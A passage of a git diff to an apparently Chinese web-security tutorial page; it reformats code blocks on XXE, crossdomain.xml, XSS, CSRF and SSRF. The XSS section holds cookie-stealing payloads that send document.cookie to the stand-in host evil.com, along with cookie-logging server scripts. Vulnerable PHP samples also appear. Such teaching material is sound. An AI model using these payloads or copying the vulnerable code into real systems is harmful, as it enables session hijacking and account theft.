@@ -459,21 +459,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-18
+                    2021-08-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    14k
+                    13.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    56 分
+                    55 分
                 </div>
                 
 
@@ -514,9 +514,10 @@
 <h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE Injection 即 XML External Entity Injection，也就是 XML 外部实体注入攻击. 漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。</p>
 <p>在 XML 1.0 标准里，XML 文档结构⾥里定义了实体（entity）这个概念. 实体可以通过预定义在文档中调用，实体的标识符可访问本地或远程内容. 如果在这个过程中引入了「污染」源，在对 XML 文档处理后则可能导致信息泄漏等安全问题。</p>
 <h2 id="XSCH"><a href="#XSCH" class="headerlink" title="XSCH"></a>XSCH</h2><p>由于网站开发者在使用 Flash、Silverlight 等进行开发的过程中的疏忽，没有对跨域策略文件（crossdomain.xml）进行正确的配置导致问题产生。 例如：</p>
-<pre><code>&lt;cross-domain-policy&gt;
-    &lt;allow-access-from domain=“*”/&gt;
-&lt;/cross-domain-policy&gt;</code></pre><p>因为跨域策略文件配置为 <code>*</code>，也就指任意域的 Flash 都可以与它交互，导致可以发起请求、获取数据。</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cross-domain-policy</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>allow-access-from</span> <span class="token attr-name">domain</span><span class="token attr-value"><span class="token punctuation">=</span>“*”/</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cross-domain-policy</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>因为跨域策略文件配置为 <code>*</code>，也就指任意域的 Flash 都可以与它交互，导致可以发起请求、获取数据。</p>
 <h2 id="越权（功能级访问缺失）"><a href="#越权（功能级访问缺失）" class="headerlink" title="越权（功能级访问缺失）"></a>越权（功能级访问缺失）</h2><p>越权漏洞是 WEB 应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。</p>
 <h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>敏感信息指不为公众所知悉，具有实际和潜在利用价值，丢失、不当使用或未经授权访问对社会、企业或个人造成危害的信息。包括：个人隐私信息、业务经营信息、财务信息、人事信息、IT 运维信息等。 泄露途径包括 Github、百度文库、Google code、网站目录等。</p>
 <h2 id="错误的安全配置"><a href="#错误的安全配置" class="headerlink" title="错误的安全配置"></a>错误的安全配置</h2><p>Security Misconfiguration：有时候，使用默认的安全配置可能会导致应用程序容易遭受多种攻击。在已经部署的应用、WEB 服务器、数据库服务器、操作系统、代码库以及所有和应用程序相关的组件中，都应该使用现有的最佳安全配置，这一点至关重要。</p>
@@ -661,66 +662,71 @@ mysql&gt; select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'
 <h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</p>
 <p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
 <p>服务器端代码：</p>
-<pre><code>&lt;?php 
-// Is there any input? 
-if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { 
-    // Feedback for end user 
-    echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; 
-} 
-?&gt;</code></pre><p>可以看到，代码直接引用了 <code>name</code> 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+<span class="token comment" spellcheck="true">// Is there any input? </span>
+<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token comment" spellcheck="true">// Feedback for end user </span>
+    <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Hello '</span> <span class="token punctuation">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span> 
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到，代码直接引用了 <code>name</code> 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。</p>
 <h3 id="持久型-XSS"><a href="#持久型-XSS" class="headerlink" title="持久型 XSS"></a>持久型 XSS</h3><p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p>
 <p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
 <p>服务器端代码：</p>
-<pre><code>&lt;?php
-  if( isset( $_POST[ 'btnSign' ] ) ) {
-    // Get input
-    $message = trim( $_POST[ 'mtxMessage' ] );
-    $name    = trim( $_POST[ 'txtName' ] );
-    // Sanitize message input
-    $message = stripslashes( $message );
-    $message = mysql_real_escape_string( $message );
-    // Sanitize name input
-    $name = mysql_real_escape_string( $name );
-    // Update database
-    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
-    $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );
-    //mysql_close(); }
-?&gt;</code></pre><p>代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'btnSign'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">// Get input</span>
+    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'mtxMessage'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$name</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'txtName'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// Sanitize message input</span>
+    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// Sanitize name input</span>
+    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// Update database</span>
+    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span> <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">//mysql_close(); }</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。</p>
 <h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p>
 <p>HTML 代码：</p>
-<pre><code>&lt;html&gt;
-  &lt;head&gt;
-    &lt;title&gt;DOM-XSS test&lt;/title&gt;
-  &lt;/head&gt;
-  &lt;body&gt;
-    &lt;script&gt;
-      var a=document.URL;
-      document.write(a.substring(a.indexOf("a=")+2,a.length));
-    &lt;/script&gt;
-  &lt;/body&gt;
-&lt;/html&gt;</code></pre><p>将代码保存在 domXSS.html 中，浏览器访问：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>DOM-XSS test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+      <span class="token keyword">var</span> a<span class="token operator">=</span>document<span class="token punctuation">.</span>URL<span class="token punctuation">;</span>
+      document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"a="</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>将代码保存在 domXSS.html 中，浏览器访问：</p>
 <pre><code>http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre><p>即可触发 XSS 漏洞。</p>
 <h2 id="XSS-利用方式"><a href="#XSS-利用方式" class="headerlink" title="XSS 利用方式"></a>XSS 利用方式</h2><h3 id="Cookies-窃取"><a href="#Cookies-窃取" class="headerlink" title="Cookies 窃取"></a>Cookies 窃取</h3><p>攻击者可以使用以下代码获取客户端的 Cookies 信息：</p>
-<pre><code>&lt;script&gt;
-document.location="http://www.evil.com/cookie.asp?cookie="+document.cookie
-new Image().src="http://www.evil.com/cookie.asp?cookie="+document.cookie
-&lt;/script&gt;
-&lt;img src="http://www.evil.com/cookie.asp?cookie="+document.cookie&gt;&lt;/img&gt;</code></pre><p>在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下：</p>
-<pre><code>&lt;%
-  msg=Request.ServerVariables("QUERY_STRING")
-  testfile=Server.MapPath("cookie.txt")
-  set fs=server.CreateObject("Scripting.filesystemobject")
-  set thisfile=fs.OpenTextFile(testfile,8,True,0)
-  thisfile.Writeline(""&amp;msg&amp; "")
-  thisfile.close
-  set fs=nothing
-%&gt;
-&lt;?php
-$cookie = $_GET['cookie'];
-$log = fopen("cookie.txt", "a");
-fwrite($log, $cookie . "\n");
-fclose($log);
-?&gt;</code></pre><p>攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">"http://www.evil.com/cookie.asp?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie
+<span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"http://www.evil.com/cookie.asp?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+&lt;img src="http://www.evil.com/cookie.asp?cookie="+document.cookie><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">%</span>
+  msg<span class="token operator">=</span>Request<span class="token punctuation">.</span><span class="token function">ServerVariables</span><span class="token punctuation">(</span><span class="token string">"QUERY_STRING"</span><span class="token punctuation">)</span>
+  testfile<span class="token operator">=</span>Server<span class="token punctuation">.</span><span class="token function">MapPath</span><span class="token punctuation">(</span><span class="token string">"cookie.txt"</span><span class="token punctuation">)</span>
+  set fs<span class="token operator">=</span>server<span class="token punctuation">.</span><span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Scripting.filesystemobject"</span><span class="token punctuation">)</span>
+  set thisfile<span class="token operator">=</span>fs<span class="token punctuation">.</span><span class="token function">OpenTextFile</span><span class="token punctuation">(</span>testfile<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>True<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+  thisfile<span class="token punctuation">.</span><span class="token function">Writeline</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token operator">&amp;</span>msg<span class="token operator">&amp;</span> <span class="token string">""</span><span class="token punctuation">)</span>
+  thisfile<span class="token punctuation">.</span>close
+  set fs<span class="token operator">=</span>nothing
+<span class="token operator">%</span><span class="token operator">></span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span> <span class="token variable">$cookie</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。</p>
 <h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
 <p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。</p>
 <p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XMLHTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。</p>
@@ -790,25 +796,27 @@ fclose($log);
 <pre><code>@import ""
 background:url("")
 ......</code></pre><p>也可使用表单来对 POST 型的请求进行伪造。</p>
-<pre><code>&lt;form action="http://www.a.com/register" id="register" method="post"&gt;
-  &lt;input type=text name="username" value="" /&gt;
-  &lt;input type=password name="password" value="" /&gt;
-&lt;/form&gt;
-&lt;script&gt;
-  var f = document.getElementById("register");
-  f.inputs[0].value = "test";
-  f.inputs[1].value = "passwd";
-  f.submit();
-&lt;/script&gt;</code></pre><h3 id="Flash-CSRF"><a href="#Flash-CSRF" class="headerlink" title="Flash CSRF"></a>Flash CSRF</h3><p>Flash 也有各种方式可以发起网络请求，包括 POST。</p>
-<pre><code>import flash.net.URLRequest;
-import flash.system.Security;
-var url = new URLRequest("http://target/page");
-var param = new URLVariables();
-param = "test=123";
-url.method = "POST";
-url.data = param;
-sendToURL(url);
-stop();</code></pre><p>Flash 中还可以使用 <code>getURL</code>、<code>loadVars</code> 等方式发起请求。</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.a.com/register<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>register<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>text</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>password</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+  <span class="token keyword">var</span> f <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"register"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  f<span class="token punctuation">.</span>inputs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span>
+  f<span class="token punctuation">.</span>inputs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"passwd"</span><span class="token punctuation">;</span>
+  f<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="Flash-CSRF"><a href="#Flash-CSRF" class="headerlink" title="Flash CSRF"></a>Flash CSRF</h3><p>Flash 也有各种方式可以发起网络请求，包括 POST。</p>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">import</span> flash<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URLRequest<span class="token punctuation">;</span>
+<span class="token keyword">import</span> flash<span class="token punctuation">.</span>system<span class="token punctuation">.</span>Security<span class="token punctuation">;</span>
+<span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLRequest</span><span class="token punctuation">(</span><span class="token string">"http://target/page"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> param <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLVariables</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+param <span class="token operator">=</span> <span class="token string">"test=123"</span><span class="token punctuation">;</span>
+url<span class="token punctuation">.</span>method <span class="token operator">=</span> <span class="token string">"POST"</span><span class="token punctuation">;</span>
+url<span class="token punctuation">.</span>data <span class="token operator">=</span> param<span class="token punctuation">;</span>
+<span class="token function">sendToURL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Flash 中还可以使用 <code>getURL</code>、<code>loadVars</code> 等方式发起请求。</p>
 <pre><code>req = new LoadVars();
 req.addRequestHeader("foo", "bar");
 req.send("http://target/page?v1=123&amp;v2=222", "_blank", "GET");</code></pre><h2 id="CSRF-的防御"><a href="#CSRF-的防御" class="headerlink" title="CSRF 的防御"></a>CSRF 的防御</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>验证码强制用户必须与应用进行交互，才能完成最终请求。</p>
@@ -836,55 +844,58 @@ req.send("http://target/page?v1=123&amp;v2=222", "_blank", "GET");</code></pre><
 </ul>
 <h2 id="常用的后端实现"><a href="#常用的后端实现" class="headerlink" title="常用的后端实现"></a>常用的后端实现</h2><ol>
 <li><p><code>file_get_contents</code></p>
-<pre><code>&lt;?php
-if (isset($_POST['url'])) { 
-    $content = file_get_contents($_POST['url']); 
-    $filename ='./images/'.rand().';img1.jpg'; 
-    file_put_contents($filename, $content); 
-    echo $_POST['url']; 
-    $img = "&lt;img src=\"".$filename."\"/&gt;"; 
-}
-echo $img;
-?&gt;</code></pre><p>这段代码使用 <code>file_get_contents</code> 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token string">'./images/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">';img1.jpg'</span><span class="token punctuation">;</span> 
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+    <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token string">"&lt;img src=\""</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"\"/>"</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span>
+<span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这段代码使用 <code>file_get_contents</code> 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。</p>
 </li>
 <li><p><code>fsockopen()</code></p>
-<pre><code>&lt;?php 
-function GetFile($host,$port,$link) { 
-    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
-    if (!$fp) { 
-        echo "$errstr (error number $errno) \n"; 
-    } else { 
-        $out = "GET $link HTTP/1.1\r\n"; 
-        $out .= "Host: $host\r\n"; 
-        $out .= "Connection: Close\r\n\r\n"; 
-        $out .= "\r\n"; 
-        fwrite($fp, $out); 
-        $contents=''; 
-        while (!feof($fp)) { 
-            $contents.= fgets($fp, 1024); 
-        } 
-        fclose($fp); 
-        return $contents; 
-    } 
-}
-?&gt;</code></pre><p>这段代码使用 <code>fsockopen</code> 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+<span class="token keyword">function</span> <span class="token function">GetFile</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+        <span class="token keyword">echo</span> <span class="token string">"$errstr (error number $errno) \n"</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
